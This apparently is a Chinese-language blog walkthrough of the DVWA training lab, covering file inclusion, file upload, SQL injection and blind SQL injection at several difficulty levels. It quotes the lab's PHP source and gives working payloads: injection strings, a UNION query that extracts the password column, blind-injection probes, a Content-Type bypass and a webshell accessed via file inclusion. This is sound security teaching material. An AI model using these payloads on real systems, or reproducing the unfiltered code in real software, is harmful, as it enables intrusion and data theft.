<h3 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">"include.php"</span> &amp;&amp; $file != <span class="string">"file1.php"</span> &amp;&amp; $file != <span class="string">"file2.php"</span> &amp;&amp; $file != <span class="string">"file3.php"</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn't the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里看到，除了它页面显示的文件和include.php，其他的都不能进行包含，使用了白名单过滤的方法，包含的文件名只能等于白名单中的文件，所以避免了文件包含漏洞的产生！</p>
<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><h3 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>没有进行任何过滤，直接上传一句话结束</p>
<h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到进行了判断，只能是uploaded_type规定的 并且文件大小 小于 100000<br>我们bp抓包，修改<code>Content-Type: image/jpeg</code>,上传成功，菜刀一下</p>
<h3 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>strrpos()</code>查找 “php” 在字符串中最后一次出现的位置<br><code>getimagesize()</code> 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息</p>
<p>可以看到这次用了strrpos来判断.最后出现的位置，也就意味<code>.</code>后必须为图片，还是用了getimagesize()来获取图片的相关信息，所以使用图片马，这里就用到了刚才说的文件包含漏洞<br>菜刀连接<code>http://localhost/DVWA/vulnerabilities/fi/?page=file:///F:/phpstudy_pro/WWW/DVWA/hackable/uploads/1.jpg</code></p>
<h3 id="impossible-2"><a href="#impossible-2" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">'hackable/uploads/'</span>;</span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';</span></span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext;</span><br><span class="line">    $temp_file     = ( ( ini_get( <span class="string">'upload_tmp_dir'</span> ) == <span class="string">''</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">'upload_tmp_dir'</span> ) ) );</span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">'jpg'</span> || strtolower( $uploaded_ext ) == <span class="string">'jpeg'</span> || strtolower( $uploaded_ext ) == <span class="string">'png'</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_type == <span class="string">'image/jpeg'</span> || $uploaded_type == <span class="string">'image/png'</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">        <span class="keyword">if</span>( $uploaded_type == <span class="string">'image/jpeg'</span> ) &#123;</span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp );</span><br><span class="line">            imagejpeg( $img, $temp_file, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp );</span><br><span class="line">            imagepng( $img, $temp_file, <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( $img );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">        <span class="keyword">if</span>( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files</span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( $temp_file ) )</span><br><span class="line">            unlink( $temp_file );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>imagecreatefromjpeg(filename)</code>从给定的文件或url中创建一个新的图片</p>
<p><code>imagejpeg(image,filename,quality)</code>从image图像中以 filename 文件名创建一个jpeg的图片，参数quality可选，0-100 (质量从小到大)</p>
<p><code>imagedestroy(image)</code>销毁图像</p>
<p>可以看到，Impossible级别对上传的文件进行了重命名（为md5值，导致00截断无法绕过过滤规则），并且加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>没有做任何的过滤和限制，直接注入<br>payload:<code>1&#39; or &#39;1&#39;=&#39;1</code></p>
<h3 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    $id = mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>], $id);</span><br><span class="line"></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">"SELECT COUNT(*) FROM users;"</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>mysql_real_escape_string</code>函数对特殊符号\x00,\n,\r,\,’,”,\x1a进行转义,且使用了单选列表的方式来获取信息，我们可以bp抓包<br>payload：<code>id=1 or 1=1#&amp;Submit=Submit</code></p>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
<p>使用了limit 1 限制了显示一行，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样<br>payload：<code>1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users#</code></p>
<h3 id="impossible-3"><a href="#impossible-3" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用了PDO和预编译语句，还防止了CSRF</p>
<h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>bool盲注<br>payload<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 #</code><br>时间盲注：<br>payload<code>1&#39; and if(length(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1))=7,sleep(5),1)</code>明显延迟</p>
<p>剩下的写脚本就行<br>medium，high基本一致</p>
<h3 id="impossible-4"><a href="#impossible-4" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">            header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>PDO，预编译+session令牌</p>
<h2 id="Weak-Session-IDs"><a href="#Weak-Session-IDs" class="headerlink" title="Weak Session IDs"></a>Weak Session IDs</h2><p>当用户登录后，在服务器就会创建一个会话(session)，叫做会话控制，接着访问页面的时候就不用登录，只需要携带</p>
<p>Sesion去访问。</p>
<p>sessionID作为特定用户访问站点所需要的唯一内容。如果能够计算或轻易猜到该sessionID，则攻击者将可以轻易获取访问权</p>
<p>限，无需录直接进入特定用户界面，进而进行其他操作。</p>
<p>用户访问服务器的时候，在服务器端会创建一个新的会话(Session)，会话中会保存用户的状态和相关信息，用于标识用户。</p>
